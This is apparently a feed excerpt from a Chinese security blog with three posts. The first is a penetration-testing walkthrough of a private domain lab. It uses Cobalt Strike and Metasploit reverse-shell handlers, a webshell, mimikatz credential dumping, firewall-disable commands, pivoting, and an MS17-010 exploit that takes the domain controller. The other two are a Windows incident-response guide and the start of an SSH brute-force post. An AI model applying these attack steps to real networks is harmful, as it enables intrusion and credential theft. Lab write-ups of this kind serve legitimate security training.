        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211123154003.jpeg" loading="lazy"><br>曾经 你说看星星看日落不如看我的眼眸……</p><a id="more"></a><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>直接选择虚拟机打开即可，默认密码均为<code>hongrisec@2019</code>，开机后会提示改密码，修改一下。然后进入，会提示重启更新配置。重启一下。然后给三台虚拟机单独分配一个网络适配器(<code>VMnet2</code>)，其中win7需要增加一个网络适配器2。如图</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120202649.png" loading="lazy"></p><pre class="language-bash" data-language="bash"><code class="language-bash">win7:内网IP：192.168.52.143外网IP：192.168.88.137<span class="token punctuation">(</span>记得将phpstudy服务运行起来<span class="token punctuation">)</span>Kali<span class="token punctuation">(</span>攻击IP<span class="token punctuation">)</span>：192.168.88.128   windows 2k3：192.168.52.141     域内成员机Windows server <span class="token number">2008</span>：192.168.52.138 域控服务器</code></pre><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>内网收集信息，先扫描存活主机。</p><pre class="language-bash" data-language="bash"><code class="language-bash">netdiscover -i eth0 -r <span class="token number">192.168</span>.1/0/24</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120203312.png" loading="lazy"></p><p>根据扫描结果发现域内主机有三个，<code>192.168.52.143/138/141</code>，这三台主机是无法访问的，其中还有一台<code>192.168.88.137</code>可以访问的，也就是与攻击机Kali在同一个IP段内。</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>使用<code>Nmap</code>来进行扫描</p><pre class="language-bash" data-language="bash"><code class="language-bash">nmap -sC -v -n -sV -Pn -p <span class="token number">1</span>-65535 <span class="token number">192.168</span>.88.137</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120204349.png" loading="lazy"></p><p>看信息，开放端口：<code>80&amp;3306</code>，且web服务是<code>PHPstudy</code></p><p>访问查看，发现是<code>phpstudy</code>的探针,收集敏感信息</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120204555.png" alt="image-20211120204553009" loading="lazy"></p><p>可以看出，网站目录<code>C:/phpStudy/WWW/</code>，探针地址等还有禁用函数。最后还有个连接MySQL数据库的操作，尝试弱口令，<code>root:root&amp;&amp;root:123456</code>发现用户密码均为<code>root</code>，连接成功</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120204819.png" alt="image-20211120204817929" loading="lazy"></p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>使用<code>dirsearch</code>来进行扫描</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120205738.png" alt="image-20211120205736361" loading="lazy"></p><p>扫描没发现beifen.rar，由于现在这么写备份网站的已经很少了，所以常用字典中就给去掉了。实际上是有网站源码备份的。不过这里还扫出来了<code>phpmyadmin</code>网站</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120205948.png" alt="image-20211120205946070" loading="lazy"></p><p>不知道是否可以登录。然后发现是可以登录的</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120210044.png" alt="image-20211120210042695" loading="lazy"></p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol><li>信息泄露</li></ol><p>前台的公告，提示建站者修改密码，但是粗心的建站者不改，那么就可以使用这个默认用户名和密码来进行登录后台了。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120210424.png" alt="image-20211120210422501" loading="lazy"></p><p>尝试登录后台</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120210634.png" alt="image-20211120210632960" loading="lazy"></p><p><code>CMS</code>漏洞不再复现，现在直接<code>getshell</code>，并向内网延伸。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120211303.png" alt="image-20211120211301270" loading="lazy"></p><p>直接创建一句话木马。路径问题省略，自行寻找，直接连接<code>getshell</code></p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120211511.png" alt="image-20211120211510171" loading="lazy"></p><p>这里将CS的客户端还有服务端均部署在kali中</p><p>创建监听并生成powershell command，在蚁剑中执行。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120212315.png" alt="image-20211120212313909" loading="lazy"></p><p>然后在客户端，肉鸡将上线CS。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120212350.png" alt="image-20211120212349096" loading="lazy"></p><h2 id="内网与域渗透"><a href="#内网与域渗透" class="headerlink" title="内网与域渗透"></a>内网与域渗透</h2><h3 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a>内网信息收集</h3><p>使用<code>shell ipconfig</code>可以看到内网IP为<code>192.168.52.143</code></p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120213534.png" alt="image-20211120213533008" loading="lazy"></p><p>这里还是回到蚁剑操作比较方便</p><p>以及域(<code>god.org</code>)</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120214831.png" loading="lazy"></p><p>其实使用不止CS这一种C2工具，其中<code>metasploit</code>也是一个极佳的选择</p><pre class="language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler &#x2F;&#x2F;&#x2F;使用exploit&#x2F;multi&#x2F;handler进行探测set payload Windows&#x2F;meterpreter&#x2F;reverse_tcp &#x2F;&#x2F;&#x2F; 设置payload &#39;Windows&#x2F;meterpreter&#x2F;reverse_tcp&#39; 进行监听set LHOST 192.168.88.128 &#x2F;&#x2F;&#x2F;设置下主机地址run&#x2F;exploit &#x2F;&#x2F;&#x2F;开始攻击</code></pre><p>下面是一些常见的域内信息收集使用的命令。</p><pre class="language-bash" data-language="bash"><code class="language-bash">net group /domain  <span class="token comment">#查看域内所有用户列表</span>net group <span class="token string">"domain computers"</span> /domain <span class="token comment">#查看域成员计算机列表</span>net group <span class="token string">"domain admins"</span> /domain <span class="token comment">#查看域管理员用户</span><span class="token function">whoami</span> ///收集目标机器的身份<span class="token function">hostname</span> /// 显示主机名称net user ///显示用户net localgroup administrator ///显示本地管理员组</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211120215751.png" alt="image-20211120215745358" loading="lazy"></p><h3 id="主机密码收集"><a href="#主机密码收集" class="headerlink" title="主机密码收集"></a>主机密码收集</h3><p>使用<code>hashdump</code>或者<code>mimikatz</code>来进行密码读取。</p><pre class="language-bash" data-language="bash"><code class="language-bash">右键——<span class="token operator">></span>Access——<span class="token operator">></span>DumpHashes右键——<span class="token operator">></span>Access——<span class="token operator">></span>Run Mimikatz</code></pre><p>自动执行命令</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211121111346.png" loading="lazy"></p><p>然后在Credentials（凭证栏）查看获取的密码</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211121111645.png" alt="image-20211121111643980" loading="lazy"></p><h3 id="继续信息收集"><a href="#继续信息收集" class="headerlink" title="继续信息收集"></a>继续信息收集</h3><p>这里先进行一下CS与MSF联动，从CS中将会话(session)传给msf</p><p>首先在msf中启动并监听自己的IP和端口</p><pre class="language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handlerset payload windows&#x2F;meterpreter&#x2F;reverse_http（跟cs上选用的payload一样）set lhost 本机ipset lport 接受的端口exploit 执行</code></pre><p>正在运行ing…..</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211121112600.png" alt="image-20211121112559074" loading="lazy"></p><p>在CS那边，创建一个foreign监听的listener</p><blockquote><p>注意在MSF中选用的payload要与CS中相同，否则就会出现会话不合格的报错。上图中没修改，但是上面payload已经修改过了</p></blockquote><p>然后右键选择一个会话，进行转发，右键——&gt;spawn，选择foreign那个会话</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211121113951.png" alt="image-20211121113949365" loading="lazy"></p><p>然后回到msf，已经拿到了session了</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211121114038.png" alt="image-20211121114037200" loading="lazy"></p><p>小插曲过去，然后再回到信息收集中</p><ol><li>查看补丁信息</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash">run post/windows/gather/enum_patches</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211121121633.png" alt="image-20211121121632501" loading="lazy"></p><p>有点不理解，一直报错，原以为是进程的问题，尝试了换exe反弹shell，还有<code>php/meterperter/reverse_tcp</code>等方法，都是这样的结果。有点不理解。</p><ol start="2"><li>这一步跳过了，下一步，看看安装了哪些软件</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash">run post/windows/gather/enum_applications</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211121122153.png" alt="image-20211121122151939" loading="lazy"></p><p>看到有安装nmap，然后使用win7这台肉鸡对内网进行扫描。</p><ol start="3"><li>查看路由信息，并添加路由到目标环境，使得msf可以通过win7来转发访问192.168.52.0的网段。</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash">run get_local_subnets<span class="token comment"># 查看路由</span>run autoroute -s <span class="token number">192.168</span>.52.0/24<span class="token comment"># 添加路由</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211122203547.png" alt="image-20211122203545872" loading="lazy"></p><ol start="4"><li>使用arp扫描52这个网段</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash">run post/windows/gather/arp_scanner <span class="token assign-left variable">RHOSTS</span><span class="token operator">=</span><span class="token number">192.168</span>.52.0/24run auxiliary/scanner/portscan/tcp <span class="token assign-left variable">RHOSTS</span><span class="token operator">=</span><span class="token number">192.168</span>.52.141 <span class="token assign-left variable">PORTS</span><span class="token operator">=</span><span class="token number">3389</span></code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211122203920.png" alt="image-20211122203919146" loading="lazy"></p><ol start="4"><li>使用win7的nmap对域内主机进行扫描</li></ol><pre class="language-bash" data-language="bash"><code class="language-bash">shell nmap --script<span class="token operator">=</span>vuln <span class="token number">192.168</span>.52.141</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211121124820.png" alt="image-20211121124819225" loading="lazy"></p><p>然后看下在win2008扫描的的漏洞信息</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211121125423.png" alt="image-20211121125421823" loading="lazy"></p><p>发现<code>192.168.52.141</code>存在漏洞：<code>MS08-067</code>、<code>MS17-010</code>，<code>192.168.52.138</code>存在<code>MS17-010</code>漏洞。</p><h3 id="内网流量转发"><a href="#内网流量转发" class="headerlink" title="内网流量转发"></a>内网流量转发</h3><p><code>msf</code>成功反弹<code>shell</code>，并添加路由到目标环境网络。使得<code>msf</code>能够通过<code>win7</code>的路由转发访问<code>192.168.52.0/24</code>网段.</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211122210412.png" alt="image-20211122210410967" loading="lazy"></p><p>然后使用<code>socks_proxy</code>代理模块进行配置。</p><pre class="language-bash" data-language="bash"><code class="language-bash">use auxiliary/server/socks_proxy</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211122210649.png" alt="image-20211122210647415" loading="lazy"></p><p>然后使用文本编辑器修改<code>/etc/proxychains4.conf</code>文件，最后一行添加配置</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>ProxyList<span class="token punctuation">]</span>socks4 <span class="token number">192.168</span>.88.128 <span class="token number">1080</span></code></pre><p>测试下，使用nmap扫描内网靶机</p><pre class="language-bash" data-language="bash"><code class="language-bash">proxychains nmap -sT -sV -Pn -p22,80,443,445,135 --script<span class="token operator">=</span>vuln  <span class="token number">192.168</span>.52.141</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211122213952.png" alt="image-20211122213917330" loading="lazy"></p><p>关于这个代理设置踩坑的，回头单独写一篇。这里不细说这个。</p><h3 id="ms08-067获得shell"><a href="#ms08-067获得shell" class="headerlink" title="ms08-067获得shell"></a>ms08-067获得shell</h3><p>首先需要进行关闭防火墙（<code>win7+win2008+2003</code>）</p><pre class="language-bash" data-language="bash"><code class="language-bash">netsh firewall <span class="token builtin class-name">set</span> opmode disable   <span class="token comment"># windows server 2003 之前</span>netsh advfirewall <span class="token builtin class-name">set</span> allprofiles state off  <span class="token comment"># windows server 2003 之后</span></code></pre><p>然后尝试攻击</p><p>这个看了很多师傅的复现过程，很多人这里都打不通。原因未知，可能是环境出问题了</p><h3 id="ms07-010永恒之蓝getshell"><a href="#ms07-010永恒之蓝getshell" class="headerlink" title="ms07-010永恒之蓝getshell"></a>ms07-010永恒之蓝getshell</h3><p>在扫描过程中，发现的win2k3和2008都有445端口开放，都存在永恒之蓝漏洞，但是利用过程中，2003这台域内主机利用失败。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211123112330.png" alt="image-20211123112329180" loading="lazy"></p><p>现在只能想到的原因是我的meterpreter是从CS中传递过来的，方式是http，但是在msf中我使用了tcp的payload进行攻击，现在考虑整个过程只能想到是这个原因了。然后我换了一种方式，对2008进行攻击</p><p>使用的模块以及payload如下</p><pre class="language-bash" data-language="bash"><code class="language-bash">use exploit/windows/smb/ms17_010_psexec<span class="token builtin class-name">set</span> payload windows/meterpreter/bind_tcp</code></pre><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211123133538.png" alt="image-20211123133537387" loading="lazy"></p><p>但是这个攻击成功了，有点不理解了【计算机玄学】——到这里拿下了域控服务器。但是win2003还没拿到权限。</p><h3 id="SMB远程桌面口令猜测"><a href="#SMB远程桌面口令猜测" class="headerlink" title="SMB远程桌面口令猜测"></a>SMB远程桌面口令猜测</h3><p><img src="https://gitee.com/m0re/picture/raw/master/img/20211123152731.png" alt="image-20211123152729981" loading="lazy"></p><p>发现好像是2003的这台机器出问题了啊。因为漏洞在这台机器上的都不能成功利用。反而在2008机器上可以利用。</p><h3 id="Oracle数据库TNS服务漏洞"><a href="#Oracle数据库TNS服务漏洞" class="headerlink" title="Oracle数据库TNS服务漏洞"></a>Oracle数据库TNS服务漏洞</h3><p>调用模块<code>use auxiliary/admin/oracle/sid_brute</code></p><h2 id="未完待续…"><a href="#未完待续…" class="headerlink" title="未完待续…."></a>未完待续….</h2><p>内网横向待学习……</p>]]></content>
      
      
      <categories>
          
          <category> 内网安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【应急响应篇】——Windows系统排查</title>
      <link href="/posts/873290a1/"/>
      <url>/posts/873290a1/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/68.jpg" loading="lazy"><br>文章首发先知社区，原文地址——<a href="https://xz.aliyun.com/t/10434">https://xz.aliyun.com/t/10434</a></p><a id="more"></a><h2 id="Windows系统事件排查"><a href="#Windows系统事件排查" class="headerlink" title="Windows系统事件排查"></a>Windows系统事件排查</h2><p>一般情况下，各种木马病毒等恶意程序都会在计算机开机启动过程中自行启动。</p><p>在Windows系统中查看启动项，首先要排查的就是开机自启项。开始菜单里的程序中的自启</p><pre class="language-none"><code class="language-none">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup</code></pre><p>查看应用程序中是否存在陌生的程序或者可疑程序(非机主自己安装)。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211019195802393.png" alt="image-20211019195802393" loading="lazy"></p><p>启动项中，可疑文件名，</p><p>可以通过<code>msconfig</code>查看启动项，win10系统的启动项转移到任务管理器中查看了</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211019203937062.png" alt="image-20211019203937062" loading="lazy"></p><p>查看是否存在可疑项。</p><p>查看缓存文件，C盘一般在<code>C:/Windows/Temp</code></p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211019205702866.png" alt="image-20211019205702866" loading="lazy"></p><p>这些都是Windows产生的临时文件，比如：WinRAR等压缩工具对压缩包进行解压的时候会先解压在临时文件夹中，然后从这个临时文件夹中移动到目标文件夹。</p><p><code>Recent</code>系统文件夹，里面存放着最近使用的文档快捷方式，可以看到近期修改的文件以及修改日期。</p><p>打开方式：WIN+R  -&gt; <code>%UserProfile%\Recent</code></p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211019210821280.png" alt="image-20211019210821280" loading="lazy"></p><p>也可以直接通过日期选项进行排查</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211019211806801.png" alt="image-20211019211806801" loading="lazy"></p><p>再有就是查看文件的创建时间、修改时间、访问时间，黑客一般通过菜刀蚁剑类工具对文件做出修改，后面可以通过文件修改时间来判断该文件是否可疑。如果修改时间在创建时间之前，名显就是可疑文件了。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211020185931661.png" alt="image-20211020185931661" loading="lazy"></p><p>接下来是注册表，在计算机中启动项分三种</p><ol><li>一般启动项内容项在<code>计算机\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</code></li></ol><p>用户设置的启动项，删除不影响系统运行，但是一般查看的时候重点查看这里，因为这里是<code>用户设置的</code></p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211020190743849.png" alt="image-20211020190743849" loading="lazy"></p><ol start="2"><li>另一个是系统设置的启动项，删除需谨慎，一般是第三方软件的驱动程序。</li></ol><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211020191959174.png" alt="image-20211020191959174" loading="lazy"></p><ol start="3"><li>第三个启动项是很重要的，不能随便删除，都则会影响正常操作系统的正常运行。<code>计算机\HKEY_LOCAL_MACHINE\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run</code></li></ol><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211020191758379.png" alt="image-20211020191758379" loading="lazy"></p><p>入侵排查思路：</p><ol><li>弱口令修改</li><li>第一时间禁掉发现的可以账号和新增账号，使用控制面版中的用户账户工具</li></ol><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211022145322968.png" alt="image-20211022145322968" loading="lazy"></p><p>也可以看D盾_web来检测是否存在克隆账号或者隐藏账号</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211022151226390.png" alt="image-20211022151226390" loading="lazy"></p><ol start="3"><li>查看各个用户的登录时间和用户名是否异常</li></ol><h2 id="Windows系统信息排查"><a href="#Windows系统信息排查" class="headerlink" title="Windows系统信息排查"></a>Windows系统信息排查</h2><ol><li>计划任务</li></ol><p>控制面板的管理工具中存在很多工具，其中就有任务计划程序</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211020192626718.png" alt="image-20211020192626718" loading="lazy"></p><p>双击查看该程序会发现</p><p>这里列有全部的计划任务，正在运行的和准备就绪的任务都可以查看。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211022151520297.png" alt="image-20211022151520297" loading="lazy"></p><p>计划任务排查一般是查看操作，操作中显示这个任务中哪个程序在执行，查看有无危险命令和未知的可疑软件。还有就是需要注意那些触发器是<code>当用户登录时</code>的任务。不熟悉的就给它禁掉。</p><ol start="2"><li>异常端口和进程的排查</li></ol><p>在Windows系统中查看开放端口以及端口的连接情况，防止可疑连接。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211022190454486.png" alt="image-20211022190454486" loading="lazy"></p><p>901和903端口为不常见的开放端口，所以可以通过查看它的PID来进一步查询相对应的进程。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211022190712619.png" alt="image-20211022190712619" loading="lazy"></p><p>对应的VMware服务。</p><p>查看进程列表的方法还有<code>msinfo32</code></p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211022190901491.png" alt="image-20211022190901491" loading="lazy"></p><p>也可以通过D盾的web查杀工具，在工具中进行进程查看，重点关注一下没有签名信息的进程。</p><h2 id="发现隐藏后门"><a href="#发现隐藏后门" class="headerlink" title="发现隐藏后门"></a>发现隐藏后门</h2><ol><li>文件MD5校验</li></ol><p>在网上下载文件后，有些网站会在压缩包的注释处或者是下载页的明显位置放一段MD5校验值。为了防止用户需要时下载到被黑客恶意修改后的文件。</p><p>在Windows系统中进行文件的md5值的计算用到<code>certutil</code>——一个命令行程序</p><blockquote><p>早期版本的 certutil 可能无法提供本文档中所述的所有选项。 可以通过运行 或 来查看特定版本的 certutil 提供 <code>certutil -?</code> 的所有选项 <code>certutil &lt;parameter&gt; -?</code> 。</p></blockquote><p>这是微软官方的帮助文档——<a href="https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/certutil">https://docs.microsoft.com/zh-cn/windows-server/administration/windows-commands/certutil</a></p><p>一般使用<code>hashfile</code>参数来生成并显示文件上的加密函数</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211022202912541.png" alt="image-20211022202912541" loading="lazy"></p><ol start="2"><li>文件对比</li></ol><p>使用DVWA文件夹来做例子，手动给一个文件中加上一句话木马以及添加一个木马文件，测试一下</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211022204728535.png" alt="image-20211022204728535" loading="lazy"></p><p>双击异常文件，软件也可以得出具体是哪个片段的代码不同。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211022204854673.png" alt="image-20211022204854673" loading="lazy"></p><h2 id="Windows日志分析"><a href="#Windows日志分析" class="headerlink" title="Windows日志分析"></a>Windows日志分析</h2><h3 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h3><p>默认存放路径</p><pre class="language-bash" data-language="bash"><code class="language-bash">NT/Win2000/XP/Server <span class="token number">2003</span>C:<span class="token punctuation">\</span>WINDOWS<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>config<span class="token punctuation">\</span>SysEvent.EvtVista/Win7/Win8//Win10/Server <span class="token number">2008</span>/Server <span class="token number">2012</span>C:<span class="token punctuation">\</span>WINDOWS<span class="token punctuation">\</span>system32<span class="token punctuation">\</span>winevt<span class="token punctuation">\</span>Logs<span class="token punctuation">\</span>System.evtx</code></pre><p>win10系统日志文件默认存放在<code>%SystemRoot%\System32\Winevt\Logs\</code>下，该文件夹下全是Windows的各种事件日志文件。记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据。</p><p>看日志之前要先了解一下Windows系统日志信息，Windows的日志文件本质上是数据库，其中包含的元素：日期时间，用户名，计算机名，事件ID，来源，类型，描述，数据等信息都相当于相应的字段。</p><p>Windows事件日志有五种事件类型，所有的事件必须且只能拥有其中一种事件类型。</p><ol><li>信息(Information)</li></ol><p>信息事件指应用程序或服务的成功操作的事件，比如：登录成功，搜索服务等成功操作都会保留在信息事件的日志文件中。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211023101425828.png" alt="image-20211023101425828" loading="lazy"></p><ol start="2"><li>警告(Warning) </li></ol><p>警告事件指不是直接的、主要的，但是会导致将来问题发生的问题。例如，当磁盘空间不足或未找到打印机时，都会记录一个“警告”事件。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211023102924106.png" alt="image-20211023102924106" loading="lazy"></p><p>这里是数据库的格式问题报出一个警告事件。</p><ol start="3"><li>错误(Error)</li></ol><p>错误事件指用户应该知道的重要的问题。错误事件通常指功能和数据的丢失。例如, 如果一个服务不能作为系统引导被加载，那么它会产生一个错误事件。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211023103144393.png" alt="image-20211023103144393" loading="lazy"></p><ol start="4"><li>成功审核(Success audit)</li></ol><p>成功的审核安全访问尝试，主要是指安全性日志，这里记录着用户登录/注销、对象访问、特权使用、账户管理、策略更改、详细跟踪、目录服务访问、账户登录等事件，例如所有的成功登录系统都会被记录为“成功审核”事件</p><ol start="5"><li>失败审核</li></ol><p>失败的审核安全登录尝试，例如用户试图访问网络驱动器失败，则该尝试会被作为失败审核事件记录下来。</p><h3 id="事件ID"><a href="#事件ID" class="headerlink" title="事件ID"></a>事件ID</h3><p>对于Windows事件日志分析，不同的事件ID代表着不同的意义，摘录一些常见的安全事件的说明，一个登录的行为都会给挂上事件ID，比如：登录成功，登录失败也有自己对应的事件ID</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211023104816425.png" alt="image-20211023104816425" loading="lazy"></p><p>其中还有一些其它的ID，比如4672(使用超级管理员进行登录)也叫做特权登录，通过win10自带的事件查看器可以很方便的看出任务类别为<code>Special Logon</code>的特权登录操作</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211023105822357.png" alt="image-20211023105822357" loading="lazy"></p><p>系统自带的事件查看器才是最好用的工具。自带筛选功能，可以根据事件ID或者事件类型，事件发生的时间范围，等字段来进行筛选并整理日志，返回更加方便查看的结果。</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211023194519276.png" alt="image-20211023194519276" loading="lazy"></p><p>这个是为了数据效果，在虚拟机中模拟多次登录失败而生成的日志。可以看到通过使用这里的筛选功能，根据时间，时间的级别，日志类型，事件来源，事件ID，任务类别，关键字，以及用户来筛选找出相应日志记录。</p><p>成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211024105000252.png" alt="image-20211024105000252" loading="lazy"></p><h2 id="浏览器信息记录"><a href="#浏览器信息记录" class="headerlink" title="浏览器信息记录"></a>浏览器信息记录</h2><p>浏览器中的信息也是在应急响应中对黑客的攻击手段进行复现查看的一种方法，一般在浏览器中会保存浏览记录，下载记录，还有cookie信息等内容。</p><p>浏览记录：可以查看黑客在拿到此台计算机后使用浏览器进行了哪些操作，很有可能使用浏览器去下载事先准备好的放在互联网上的后门木马或者勒索病毒等危险内容。以Google浏览器为例，在需要查看历史记录的时候使用<code>chrome://history/</code></p><p>如果浏览器的历史记录已经被删除掉了，怎么查看，这里有几种常用的方法。</p><ol><li>如果电脑的谷歌浏览器是登录了账号的状态，在谷歌还未同步删除之前，可以在手机上进行查看浏览记录。</li><li>还可以通过<a href="https://myactivity.google.com/">Google活动</a>可以看到这里是查看到了我之前4月25日的访问记录。我认为这是比较方便的。</li></ol><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211024111003664.png" alt="image-20211024111003664" loading="lazy"></p><ol start="3"><li>恢复已删除 Chrome 来自Google外卖的备份文件的历史记录，可以查看近30天的历史记录活动。（需要自行备份，不合适应急响应中使用）</li></ol><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211024111430044.png" alt="image-20211024111430044" loading="lazy"></p><ol start="4"><li>使用数据恢复软件来恢复历史记录</li></ol><p>Chrome 生成文件以存储Windows或macOS上的浏览历史记录。 文件名是“ History”，看起来像 </p><p><img src="https://ios-data-recovery.com/wp-content/uploads/2019/08/chrome-history-file.jpg" alt="Chrome 历史" loading="lazy"></p><p>删除或清除历史记录后，文件将被删除， Chrome 之后，当您开始查看其他页面时，将生成一个新页面。</p><p>使用<a href="https://ios-data-recovery.com/download/data-recovery.exe">Data Recovery Do</a>安装在存储历史文件的磁盘以外的磁盘（D盘）</p><p><img src="https://gitee.com/m0re/picture/raw/master/img/image-20211024112110682.png" alt="image-20211024112110682" loading="lazy"></p><p>下载记录也是最重要的信息来源，可以看到黑客是否在互联网上下载了可疑文件或者程序。一般查杀使用D盾即够用。也可以使用在线恶意程序或文档检测工具。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>内容不多，但是耗费了一周时间来进行总结，意在为应急响应的学习开个好头，以便为后续的操作和学习打下一个坚实的基础吧。应急响应技术是针对黑客的攻击快速的做出解决方案去解决问题。这个过程是非常有趣的。</p><h3 id="学习参考内容"><a href="#学习参考内容" class="headerlink" title="学习参考内容"></a>学习参考内容</h3><p><a href="https://brownfly.gitbook.io/emergency-response/">https://brownfly.gitbook.io/emergency-response/</a></p><p><a href="https://github.com/Bypass007/Emergency-Response-Notes">https://github.com/Bypass007/Emergency-Response-Notes</a></p><p><a href="https://blog.csdn.net/uz31415926/article/details/89444303">https://blog.csdn.net/uz31415926/article/details/89444303</a></p>]]></content>
      
      
      <categories>
          
          <category> 应急响应 </category>
          
          <category> Windows篇 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【应急响应篇】——SSH暴力破解</title>
      <link href="/posts/ac3b670b/"/>
      <url>/posts/ac3b670b/</url>
      
        <content type="html"><![CDATA[<p><img src="https://gitee.com/m0re/picture/raw/master/img/20211103110728.jpeg" loading="lazy"><br>可以的话，一起去看海，去看夕阳，去看星星，你看海看夕阳看星星，我看你</p><a id="more"></a><h2 id="SSH暴力破解"><a href="#SSH暴力破解" class="headerlink" title="SSH暴力破解"></a>SSH暴力破解</h2><p>SSH是目前比较可靠的专为远程登录会话和其他网络服务提供安全性的协议，主要用于给远程登录会话加密，保证数据传输的安全。SSH的口令长度太短或者复杂度不够，如果仅包含数字和字母的话，容易被攻击者获取，一旦密码被获取，可以用来直接登录系统，控制服务器所有权限。</p><h3 id="0x01-日志分析"><a href="#0x01-日志分析" class="headerlink" title="0x01 日志分析"></a>0x01 日志分析</h3><p>查看端口是否异常，先了解一下系统账号信息。</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 查看是否存在特权用户(uid=0)</span>┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面<span class="token punctuation">]</span>└─<span class="token comment"># awk -F: '$3==0&#123;print $1&#125;' /etc/passwd</span>root</code></pre><p>查看可以远程登录的账号信息</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">awk</span> <span class="token string">'/\<span class="token variable">$1</span>|\<span class="token variable">$6</span>/&#123;print <span class="token variable">$1</span>&#125;'</span> /etc/shadow</code></pre><p><img 